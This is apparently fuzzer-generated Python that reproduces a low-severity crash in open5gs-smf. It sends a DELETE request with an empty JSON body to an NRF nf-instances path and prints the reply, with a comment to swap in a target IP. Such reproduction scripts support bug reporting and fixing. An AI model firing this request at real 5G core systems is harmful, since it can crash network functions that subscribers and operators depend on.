#!/usr/bin/env python3
# Crash reproduction for open5gs-smf (low)
# Detected: Sat May  9 02:39:09 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'DELETE'
path = '/nnrf-nfm/v1/nf-instances/PCF-fuzz-2413'
body = b'{}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
